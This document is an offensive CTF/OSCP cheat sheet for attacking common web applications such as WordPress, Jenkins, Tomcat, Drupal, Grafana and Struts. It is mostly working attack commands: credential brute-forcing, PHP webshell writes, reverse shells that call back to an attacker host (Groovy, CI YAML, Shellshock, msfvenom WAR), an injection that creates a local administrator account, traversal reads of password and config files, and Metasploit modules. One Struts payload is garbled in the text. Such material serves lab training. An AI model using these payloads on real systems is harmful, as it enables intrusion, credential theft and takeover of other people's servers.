# CTF Web - Attacking Common Applications

## Table of Contents
- [WordPress](#wordpress)
- [Joomla](#joomla)
- [Drupal](#drupal)
- [Apache Tomcat](#apache-tomcat)
- [Jenkins](#jenkins)
- [GitLab / Gitea](#gitlab--gitea)
- [Splunk](#splunk)
- [PRTG Network Monitor](#prtg-network-monitor)
- [osTicket](#osticket)
- [phpMyAdmin](#phpmyadmin)
- [Webmin](#webmin)
- [Adobe ColdFusion](#adobe-coldfusion)
- [Adminer](#adminer)
- [Grafana](#grafana)
- [OSCP-Staple Web CVEs & searchsploit Workflow](#oscp-staple-web-cves--searchsploit-workflow)

For fingerprinting/discovery that precedes this, see [web-recon.md](web-recon.md). For the local Tomcat source-review workflow, see [tomcat-local-triage.md](tomcat-local-triage.md). For Shellshock CGI triage see [shellshock-cgi-triage.md](shellshock-cgi-triage.md).

---

## WordPress
**Fingerprint:** `/wp-login.php`, `/wp-admin/`, `/wp-content/`, `/readme.html`, `<meta name="generator" content="WordPress X.Y">`, `X-Pingback` header, `/wp-json/` REST API.
```bash
curl -s http://TARGET/ | grep -Eo 'wp-content|wp-includes|generator.*WordPress'
curl -s http://TARGET/?rest_route=/wp/v2/users     # user disclosure via REST
curl -s "http://TARGET/wp-json/wp/v2/users"        # same, JSON
```

**Enumerate (wpscan):**
```bash
wpscan --url http://TARGET --enumerate u                 # users (author scan, REST, login errors)
wpscan --url http://TARGET --enumerate vp,vt,tt,cb,dbe --api-token <TOKEN>
wpscan --url http://TARGET --enumerate ap --plugins-detection aggressive   # all plugins, brute paths
```

**Credential brute (xmlrpc is fastest — multicall amplifies):**
```bash
wpscan --url http://TARGET --usernames admin,editor --passwords /usr/share/wordlists/rockyou.txt
# xmlrpc system.multicall - hundreds of guesses per request
curl -s -X POST http://TARGET/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASS</value></param></params></methodCall>'
# xmlrpc also enables pingback SSRF: pingback.ping method
```

**Authenticated -> RCE:**
1. **Theme editor:** Appearance > Theme Editor (`/wp-admin/theme-editor.php`) -> edit an inactive theme's `404.php`/`header.php` to a PHP webshell -> request it at `/wp-content/themes/<theme>/404.php`.
2. **Plugin editor / plugin upload:** Plugins > Add New > Upload a malicious zip plugin containing a PHP shell, activate it.
3. **Metasploit (admin creds):**
```
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME admin; set PASSWORD pass; set RHOSTS TARGET; set TARGETURI /
```
4. **Vulnerable plugin RCE** is the most common real path — identify plugin+version, then `searchsploit <plugin>`. Notable: mail-masta LFI, wpDiscuz 7.0.4 unauth upload (CVE-2020-24186), File Manager 6.0-6.8 unauth RCE (CVE-2020-25213), Social Warfare (CVE-2019-9978).

---

## Joomla
**Fingerprint:** `/administrator/`, `/language/en-GB/en-GB.xml` (version), `/media/system/js/`, `<meta name="generator" content="Joomla!">`, `README.txt`.
```bash
curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep -Eo '<version>[^<]+'
curl -s http://TARGET/language/en-GB/en-GB.xml | grep version
```

**Enumerate:**
```bash
joomscan --url http://TARGET --enumerate-components
droopescan scan joomla -u http://TARGET
```

**Default/known:** admin account is `admin`; no default password (set at install). Brute the admin login. Older stacks: SQLi CVE-2015-7297/7857/7858 (com_contenthistory) dumps session tokens -> admin.
```bash
# com_contenthistory SQLi (Joomla 3.2-3.4.4)
searchsploit joomla 3.4 sql
```

**Authenticated -> RCE (admin template editor):**
1. Log in to `/administrator/`.
2. Extensions > Templates > Templates (site or admin) -> pick a template (e.g., protostar/beez3) -> edit `error.php` or `index.php` -> insert PHP webshell.
3. Save, then request the file directly: `/templates/<template>/error.php?cmd=id` (site) — path varies; `/administrator/templates/...` for admin template.
```
# Metasploit
use exploit/multi/http/joomla_http_header_rce      # CVE-2015-8562 (unauth, PHP object injection, Joomla 1.5-3.4.5)
```

---

## Drupal
**Fingerprint:** `X-Generator: Drupal N`, `X-Drupal-Cache`, `/CHANGELOG.txt`, `/core/CHANGELOG.txt` (D8+), `/user/login`, `/sites/default/`, `node/1`.
```bash
curl -sI http://TARGET/ | grep -i x-generator
curl -s http://TARGET/CHANGELOG.txt | head -1        # D7
curl -s http://TARGET/core/CHANGELOG.txt | head -1   # D8+
droopescan scan drupal -u http://TARGET
```

**Drupalgeddon2 — CVE-2018-7600 (unauth RCE, D7 < 7.58, D8 < 8.5.1):** form API injection via `#` render array in user-registration/AJAX endpoints.
```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS TARGET; set TARGETURI /; exploit
```
Manual PoC (drupalgeddon2 python scripts widely mirrored): POST to `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax` with `form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id`.

**Drupalgeddon3 — CVE-2018-7602 (authenticated RCE, needs a session + node delete perm):** also form-API `#` injection, requires CSRF token from a node edit form.
```
use exploit/unix/webapp/drupal_drupalgeddon3
set DRUPAL_SESSION <cookie>; set DRUPAL_NODE 1
```
Also: **CVE-2019-6340** (unauth REST RCE via deserialization, D8 with RESTful Web Services). PHP filter module: if enabled, an admin can post PHP directly in a node body.

---

## Apache Tomcat
**Fingerprint:** default port 8080, `Server: Apache-Tomcat`, `/manager/html`, `/host-manager/html`, default 404 page shows version.
```bash
curl -s http://TARGET:8080/manager/html -u tomcat:tomcat
```

**Default/known creds** (`conf/tomcat-users.xml`): `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, `admin:` (blank), `role1:role1`.
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt TARGET http-get /manager/html
```

**Authenticated -> RCE (WAR deploy via manager/text):**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOU LPORT=4444 -f war -o shell.war
# Deploy through the text interface
curl -u tomcat:tomcat --upload-file shell.war "http://TARGET:8080/manager/text/deploy?path=/shell"
curl http://TARGET:8080/shell/           # trigger (jsp inside war)
# List / undeploy
curl -u tomcat:tomcat "http://TARGET:8080/manager/text/list"
curl -u tomcat:tomcat "http://TARGET:8080/manager/text/undeploy?path=/shell"
```
```
use exploit/multi/http/tomcat_mgr_upload      # authenticated WAR upload
use exploit/multi/http/tomcat_mgr_deploy
```
Also **CVE-2017-12615** (PUT JSP when readonly=false), **CVE-2020-1938 Ghostcat** (AJP file read/include on port 8009 -> read `WEB-INF/web.xml`, sometimes RCE). For local source/WAR review see [tomcat-local-triage.md](tomcat-local-triage.md).

---

## Jenkins
**Fingerprint:** port 8080, `X-Jenkins: <version>` header, `/login?from=%2F`, "Jenkins" title, `/api/json`.
```bash
curl -sI http://TARGET:8080/ | grep -i x-jenkins
```

**Script Console -> Groovy RCE** (`/script`, needs admin OR unauth if security disabled):
```groovy
// Paste at /script (Manage Jenkins > Script Console)
println "id".execute().text
// Reverse shell
String host="YOU";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```
```bash
# Script console over HTTP
curl -s -u admin:pass "http://TARGET:8080/scriptText" --data-urlencode 'script=println "id".execute().text'
```
```
use exploit/multi/http/jenkins_script_console
```
**Unauth paths:** **CVE-2018-1000861** (unauth RCE via stapler/Groovy metaprogramming), **CVE-2019-1003000** + related (script-security sandbox bypass, unauth RCE on older with Anonymous read). Recent: **CVE-2024-23897** (arbitrary file read via CLI `@`-file argument expansion) — often the foothold to read secrets/creds:
```bash
java -jar jenkins-cli.jar -s http://TARGET:8080/ help "@/etc/passwd"
```
Also enumerate build history, credentials.xml, and job configs after any shell.

---

## GitLab / Gitea
**Fingerprint:** GitLab `/help`, `/-/health`, footer version, `X-Gitlab-*`; Gitea `/api/v1/version`, "Powered by Gitea" footer.
```bash
curl -s http://TARGET/api/v1/version              # Gitea version
curl -s http://TARGET/help | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+'   # GitLab (login-gated on newer)
```

**GitLab known CVEs:**
- **CVE-2021-22205** (unauth RCE, GitLab CE/EE < 13.10.3 via ExifTool DjVu on image upload) — the classic HTB/OSCP-era GitLab foothold.
```
use exploit/multi/http/gitlab_exif_rce
```
- **CVE-2021-22214** (unauth SSRF via CI lint API), **CVE-2020-10977** (path traversal -> RCE via issue move), **CVE-2023-7028** (account takeover via password reset to arbitrary email).
- Register a user if open registration is on; check `/explore` for public repos leaking creds.

**Gitea known CVEs:** **CVE-2022-30781** (git hook RCE if you can create/edit repo git hooks with admin/repo-admin — enable via `ENABLE_PUSH_CREATE`/git hooks), older versions allow SSRF and stored XSS. Default admin often set at install.

**CI abuse (both):** with repo write access, push a malicious `.gitlab-ci.yml` / `.gitea/workflows/*.yml` that runs commands on the runner — trivial RCE on the CI executor. See [auth-infra.md](auth-infra.md) for CI credential theft.
```yaml
# .gitlab-ci.yml
rce:
  script:
    - bash -c 'bash -i >& /dev/tcp/YOU/4444 0>&1'
```

---

## Splunk
**Fingerprint:** port 8000 (web) / 8089 (mgmt API), "splunkd" `Server` header, `/en-US/account/login`, `/services/server/info`.
```bash
curl -sk https://TARGET:8089/services/server/info -u admin:changeme
```

**Default creds:** `admin:changeme` (pre-7.1). Free/trial Splunk has no auth on some endpoints.

**Authenticated -> RCE (custom app with scripted input):** Splunk runs scripts bundled in apps. Upload a malicious app (SplunkWhisperer2 technique) whose `inputs.conf` runs a reverse-shell script; works from a forwarder or web with `edit`/`admin` capability.
```bash
# SplunkWhisperer2 (remote): abuses the REST API to deploy a bundle that executes on the target
python3 PySplunkWhisperer2_remote.py --host TARGET --port 8089 --username admin --password changeme \
  --lhost YOU --payload 'rev shell here' --scheme https
```
Manual: build an app dir with `bin/rev.sh` + `default/inputs.conf` `[script://./bin/rev.sh]`, tar it, upload via `/en-US/manager/appinstall/_upload` or `/services/apps/local`.

---

## PRTG Network Monitor
**Fingerprint:** port 8080/443, "PRTG Network Monitor" login page, `/index.htm`, version in page footer / `/api/`.

**Default creds:** `prtgadmin:prtgadmin`.

**CVE-2018-9276 (authenticated command injection, PRTG < 18.2.39):** notification "Execute Program" / demo EXE notification passes params to a PowerShell command unsanitized. Create a notification with a crafted name to inject commands (adds a local admin, etc.).
```
use exploit/windows/http/prtg_authenticated_rce
set ADMIN_USERNAME prtgadmin; set ADMIN_PASSWORD prtgadmin; set RHOSTS TARGET
```
Manual: authenticate, POST to `/api/addnotification.htm` with `injection` param like `test.txt;net user pentest Passw0rd! /add;net localgroup administrators pentest /add` in the notification's parameter, then trigger it.

---

## osTicket
**Fingerprint:** `/scp/login.php` (staff control panel), "powered by osTicket", `/api/`.

**Attack surface:**
- **Email/ticket-based access:** creating a ticket generates an email; if the box uses osTicket-generated addresses, register on a related app with `<ticket>@<domain>` and read the reply/verification in the ticket thread (classic HTB chain).
- **CVE-2021-24571 / file upload:** older versions allow uploading files with dangerous extensions to `/attachments/` when MIME checks are weak.
- **CVE-2017-15006:** stored XSS via file upload name.
- **SQLi CVE-2020-24881** SSRF, and various auth SQLi in old builds — `searchsploit osticket`.
- Default: admin created at install; brute `/scp/login.php`.

---

## phpMyAdmin
**Fingerprint:** `/phpmyadmin/`, `/pma/`, `/dbadmin/`, "phpMyAdmin" title, `pmaCookieVer` cookie, version in `Documentation.html` / `ChangeLog`.
```bash
curl -s http://TARGET/phpmyadmin/ChangeLog | head -5
```

**Default/known creds:** `root:` (blank), `root:root`, `root:toor`, `pma:`. Brute via the login form.

**Authenticated -> RCE:**
1. **SQL -> file write (webshell)** when `FILE` priv + writable webroot + `secure_file_priv` empty:
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php';
```
Check first: `SHOW VARIABLES LIKE 'secure_file_priv';`
2. **SQL -> read files:** `SELECT LOAD_FILE('/etc/passwd');`
3. **CVE-2018-12613** (LFI/RCE, PMA 4.8.0-4.8.1): `?target=db_sql.php%253f/../../../../etc/passwd` via `index.php?target=` — combine with a session/log to execute PHP.
```
use exploit/multi/http/phpmyadmin_lfi_rce      # CVE-2018-12613
```
4. **CVE-2016-5734** (RCE via preg_replace `/e` in PMA 4.x) `searchsploit phpmyadmin`.

---

## Webmin
**Fingerprint:** port 10000 (https), "Webmin" login, `Server: MiniServ/<ver>`, `/session_login.cgi`.
```bash
curl -sk https://TARGET:10000/ | grep -i webmin
```

**CVE-2019-15107 (unauth RCE, Webmin 1.882-1.921 with password change enabled):** the `password_change.cgi` `old` parameter is passed to a shell unsanitized when `passwd_mode` allows expired-password change.
```bash
curl -sk "https://TARGET:10000/password_change.cgi" \
  -H "Referer: https://TARGET:10000/session_login.cgi" \
  --data "user=root&pam=&expired=2&old=test|id&new1=test&new2=test"
```
```
use exploit/linux/http/webmin_backdoor          # CVE-2019-15107
use exploit/unix/webapp/webmin_show_cgi_exec    # authenticated, CVE-2012-2982
```
Also **CVE-2019-15642** (authenticated RCE via `rpc.cgi`).

---

## Adobe ColdFusion
**Fingerprint:** ports 8500/80/443, `/CFIDE/administrator/index.cfm`, `.cfm`/`.cfc` extensions, `Server:` may show JRun, `cfid`/`cftoken` cookies.

**LFI -> creds (CVE-2010-2861, CF 8/9 admin LFI):** read the admin password hash then log in.
```bash
curl -s "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../ColdFusion8/lib/password.properties%00en"
# Or logging LFI:
curl -s "http://TARGET/CFIDE/administrator/settings/mappings.cfm?locale=..%c0%af..%c0%af...%00en"
```
**Deserialization RCE:**
- **CVE-2017-3066** (BlazeDS AMF Java deserialization, CF 11/2016) -> unauth RCE.
- **CVE-2023-26360 / CVE-2023-26359** (deserialization/access-control, CF 2018/2021) -> unauth arbitrary read + RCE.
```
use exploit/multi/http/coldfusion_rds
use exploit/windows/http/coldfusion_fckeditor    # CVE-2009-2265 file upload -> shell
```
After admin access: **Scheduled Tasks** -> schedule an HTTP task that fetches a `.cfm` shell to the webroot, or **Mappings/Debugging** to write a CFM shell. `<cfexecute>` runs OS commands from a CFM page.

---

## Adminer
**Fingerprint:** single `adminer.php` / `adminer-<ver>.php`, "Adminer" login with Server field, version bottom-right.

**No default creds** (it connects to whatever DB creds you supply) — but Adminer's login lets you point it at an **arbitrary server**, which is the whole attack:
- **SSRF / connect-back credential theft (CVE-2021-21311 and the classic Adminer < 4.6.3 file read):** enter YOUR attacker MySQL server as the host. Adminer connects out; a rogue MySQL server (e.g., `MySQL_Fake_Server`/Rogue-MySql-Server) responds with a `LOCAL INFILE` request to read a file off the Adminer host:
```bash
# Rogue MySQL server serves LOAD DATA LOCAL to exfil files from the Adminer box
python3 rogue_mysql_server.py     # then in Adminer connect to YOU:3306
# Reads e.g. /var/www/html/config.php via LOAD DATA LOCAL INFILE
```
- If you already have valid DB creds for the local DB, use Adminer as a SQL console -> `INTO OUTFILE` webshell (same as phpMyAdmin path).
- Use SSRF to reach internal DB hosts not otherwise routable.

---

## Grafana
**Fingerprint:** port 3000, `/login` with Grafana logo, `/api/health` returns version JSON, `Grafana` in title.
```bash
curl -s http://TARGET:3000/api/health        # {"version":"8.3.0",...}
```

**Default creds:** `admin:admin` (forces change on first login only if not scripted).

**CVE-2021-43798 (unauth directory traversal, Grafana 8.0.0-beta1 to 8.3.0):** plugin asset path traverses to read arbitrary files.
```bash
curl -s --path-as-is "http://TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
# Grafana secrets / config / db:
curl -s --path-as-is "http://TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
curl -s --path-as-is "http://TARGET:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```
Any installed plugin id works as the prefix (alertlist, table, text, graph, cloudwatch...). Read `grafana.db` -> crack `admin` PBKDF2 hash or decrypt datasource creds with the `secret_key` from `grafana.ini`.
Also **CVE-2022-46169** (Grafana 9.x unauth RCE via metrics endpoint command injection) and authenticated data-source SSRF.

---

## OSCP-Staple Web CVEs & searchsploit Workflow

**Version -> exploit workflow:**
```bash
# 1. Pin the version (banner, generator meta, CHANGELOG, /api/health, whatweb)
whatweb -a 3 http://TARGET
# 2. Search local exploit-db mirror
searchsploit apache tomcat 9
searchsploit --cve 2021-41773
searchsploit -w drupal 7          # -w = exploit-db URLs
searchsploit -x 12345             # examine exploit by EDB-ID
searchsploit -m 12345             # mirror/copy exploit to cwd
searchsploit -u                   # update the DB
# 3. Cross-check nmap version scripts
nmap -sV --script "vuln" -p- TARGET
nmap --script http-enum,http-title,http-server-header -p80,443,8080 TARGET
# 4. Only trust the version you confirmed; match affected-range exactly before firing
```

**Frequently-tested infrastructure/web CVEs:**
| CVE | Target | Effect |
| --- | --- | --- |
| CVE-2014-6271 / 6278 | Bash CGI (Shellshock) | Unauth RCE via `() { :;};` in headers — see [shellshock-cgi-triage.md](shellshock-cgi-triage.md) |
| CVE-2021-41773 / 42013 | Apache httpd 2.4.49/2.4.50 | Path traversal + RCE (`/cgi-bin/` with mod_cgi) |
| CVE-2017-5638 | Apache Struts2 (Jakarta MP) | OGNL RCE via `Content-Type` header |
| CVE-2018-11776 | Apache Struts2 | OGNL RCE via namespace |
| CVE-2013-2251 | Apache Struts2 | `action:`/`redirect:` OGNL RCE |
| CVE-2014-0160 | OpenSSL (Heartbleed) | Memory disclosure — leaks keys/creds, not RCE |
| CVE-2019-0232 | Tomcat CGIServlet (Windows) | RCE via CmdLineArguments |
| CVE-2017-12617 | Tomcat | JSP upload via PUT |
| CVE-2019-11043 | PHP-FPM + nginx | RCE — see [php-fpm-fastcgi-local-triage.md](php-fpm-fastcgi-local-triage.md) |

**Shellshock (CVE-2014-6271):** any Bash-backed CGI. Inject in a header the CGI copies to env:
```bash
curl -s http://TARGET/cgi-bin/status -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'"
curl -s http://TARGET/cgi-bin/test.cgi -H "User-Agent: () { :;}; echo; echo; /bin/bash -i >& /dev/tcp/YOU/4444 0>&1"
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/status TARGET
```

**Struts2 (CVE-2017-5638) OGNL in Content-Type:**
```bash
curl -s http://TARGET/struts-app/action.action -H "Content-Type: %{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmds=(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))?{'cmd.exe','/c','id'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
```
```
use exploit/multi/http/struts2_content_type_ognl      # CVE-2017-5638
use multi/http/struts2_namespace_ognl                 # CVE-2018-11776
```

**Heartbleed (CVE-2014-0160):** not RCE — dump server memory for session tokens/creds/keys.
```bash
nmap -p443 --script ssl-heartbleed TARGET
sslscan TARGET:443 | grep -i heartbleed
# Metasploit auxiliary loops memory grabs
```
```
auxiliary/scanner/ssl/openssl_heartbleed        # set VERBOSE true; run repeatedly, grep loot
```
